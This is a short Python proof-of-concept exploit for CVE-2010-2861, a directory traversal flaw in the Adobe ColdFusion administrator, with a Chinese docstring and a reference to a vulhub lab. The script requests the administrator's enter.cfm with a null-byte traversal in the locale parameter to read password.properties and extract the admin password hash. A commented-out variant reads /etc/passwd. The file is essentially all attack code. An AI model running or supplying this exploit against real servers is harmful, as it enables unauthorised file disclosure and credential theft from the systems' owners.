# coding=utf-8
import re
import requests

"""
PoC/EXP of CVE-2010-2861_Adobe_ColdFusion Adobe ColdFusion管理控制台多个目录遍历漏洞和读取后台管理员密码

ref: https://vulhub.org/#/environments/coldfusion/CVE-2010-2861/

"""
host = "10.x.x.64"
port = "8500"
# response = requests.get('http://{}:{}/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en'.format(host,port))  # Linux

# Both
response = requests.get(
    'http://{}:{}/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en：'.format(host,
                                                                                                                  port))
# print(response.text)

ret = re.findall(r"password=(\w{40})", response.text)
if len(ret) > 0:
    ret = ret[0]

print("Get admin password hash:", ret)